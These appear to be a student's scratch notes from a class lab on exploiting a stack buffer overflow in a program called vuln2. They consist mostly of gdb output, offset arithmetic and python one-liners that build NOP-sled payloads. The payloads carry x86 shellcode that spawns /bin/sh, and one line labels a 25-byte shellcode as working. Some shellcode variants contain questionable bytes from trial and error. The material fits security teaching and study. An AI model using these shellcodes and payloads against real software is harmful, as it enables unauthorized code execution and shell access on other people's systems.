start of 0x41 buffer: 0xbffff0c4: = \xc4\xf0\xff\xbf
middle of buffer 0xbffff15c: = \x5c\xf1\xff\xbf
* 4 = 16
memory address starts at 264
264 - 16 - 19 = 229
now craft attack 5:45

NOP SLED

46 byte shellcode
264-46 = 216 NOP
23 byte shellcode 
264-23 = 241



run $(python -c "print('\x90'*229+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\xe1\x80'+'\xc4\xf0\xff\xbf')")

run $(python -c "print('\x90'*241+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\xe1\x80'+'\xc4\xf0\xff\xbf')")
$(python -c "print('\x90'*216+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\xe1\x80'+'\xc4\xf0\xff\xbf')")
\x90
2
'\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'
'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
run $(python -c "print('\x90'*216+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'+'\xc4\xf0\xff\xbf')")


0xbffff434: is where 0x90's start when running program with
(python -c "print('\x90'*228+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\xe1\x80'+'\x5c\xf1\xff\xbf'*4)")

0xbffff434: is where 0x90's start when running with 
run $(python -c "print('\x90'*229+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\xe1\x80'+'\xc4\xf0\xff\xbf')")
20 byte shellcode
+ 4 byte * 4 = 16
264-20-16
run $(python -c "print('\x90'*228+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\xe1\x80'+'\xc4\xf0\xff\xbf')")

~~~~~~~~~~~~~~~~~
\x34\xf4\xff\xbf
46 byte shellcode
'\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'
~~~~~~~~~~~~~~~~~
run $(python -c "print('\x90'*228
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
25 bytes

run $(python -c 'print "A"*116')
(gdb) print $ebp-0x6c
$3 = (void *) 0xbffff55c
(gdb) info frame
Stack level 0, frame at 0xbffff5d0:
 eip = 0x4011d3 in main (vuln2.c:8); saved eip = 0xb7df6ef1
 source language c.
 Arglist at 0xbffff5c8, args: argc=2, argv=0xbffff664
 Locals at 0xbffff5c8, Previous frame's sp is 0xbffff5d0
 Saved registers:
  ebx at 0xbffff5c4, ebp at 0xbffff5c8, eip at 0xbffff5cc

we can fill rest (112-25-(40?)) = 47 
0xbffff55c + 20 = 0xbffff570

./vuln2 $(python -c 'print "\x90"*40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*47 + "\x20\xce\xff\xff"')




THIS SHELLCODE WORKS - 25 BYTE
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
264 - 25 - 16 = 223
$(python -c 'print "\x90"*223+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\xc4\xf0\xff\xbf"*4)')
$(python -c 'print "\x90"*223+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x5c\xf1\xff\xbf"*4')
$(python -c 'print "\x90"*223+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x5c\xf1\xff\xbf"*4')
$(python -c 'print "\x90"*222+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x70\xf5\xff\xbf"*4')

0xbffff444:
\x44\xf4\xff\xbf
$(python -c 'print "\x90"*222+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x44\xf4\xff\xbf"*4')
$(python -c 'print "\x90"*200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"A"*22+"\x44\xf4\xff\xbf"*4')

r $(python -c "print('A'*264)")
x/200xb $esp
0xbffff434: start of 0x41

~~ going thru class example
0xb7df6ef1 <----- return address
0xbffff54c <----- location of saved return address
----- end of str -----
0xbffff53c:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x00 <-- end of str
0xbffff544:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xbffff54c:  -> 0xf1    0x6e    0xdf    0xb7 <- 0x02    0x00    0x00    0x00
-----
run `python -c 'print "A"*300'`

(gdb) info frame
Stack level 0, frame at 0xbffff520:
 eip = 0x4011d3 in main (vuln2.c:8); saved eip = 0x41414141
 source language c.
 Arglist at 0xbffff518, args: argc=1094795585, argv=0x41414141
 Locals at 0xbffff518, Previous frame's sp is 0xbffff520
 Saved registers:
  ebx at 0xbffff514, ebp at 0xbffff518, eip at 0xbffff51c
-- x/200x $esp
0xbffff40c:     0x14    0xf4    0xff    0xbf    0x14    0xf7    0xff    0xbf
0xbffff414:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41

(gdb) x buf
0xbffff414:     0x41
(gdb) print 0xbffff51c-0xbffff414
$1 = 264
0xbffff414 -> \x14\xf4\xff\xbf
$(python -c 'print "\x90"*227+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x14\xf4\xff\xbf"*4')
264 + 4 = 268 bytes
268- 25 - 16 = 227





